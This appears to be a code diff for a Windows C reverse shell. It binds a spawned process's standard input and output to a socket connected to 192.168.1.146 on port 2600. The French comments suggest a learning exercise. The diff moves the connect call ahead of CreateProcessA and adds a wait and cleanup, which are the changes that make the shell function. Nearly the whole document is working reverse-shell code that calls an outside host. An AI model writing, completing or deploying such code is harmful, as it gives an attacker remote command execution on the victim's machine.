@@ -28,10 +28,12 @@ int main(){
     sinfo.hStdOutput = (HANDLE)soc;
     sinfo.hStdError = (HANDLE)soc;
 
-// set server's variables
+    // set server's variables
     server.sin_family = AF_INET;
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("192.168.1.146");
+
+    connect(soc, (struct sockaddr *)&server, sizeof(server));
 
     CreateProcessA(
     NULL,           // lpApplicationName
@@ -45,8 +47,11 @@ int main(){
     &sinfo,         // lpStartupInfo (Le formulaire que tu as rempli)
     &pinfo          // lpProcessInformation (Le formulaire de retour)
 );
-
-    connect(soc, (struct sockaddr *)&server, sizeof(server));
+    WaitForSingleObject(pinfo.hProcess, INFINITE);
+    // cleanup
+    closesocket(soc);
+    WSACleanup();
+    
 
 
 
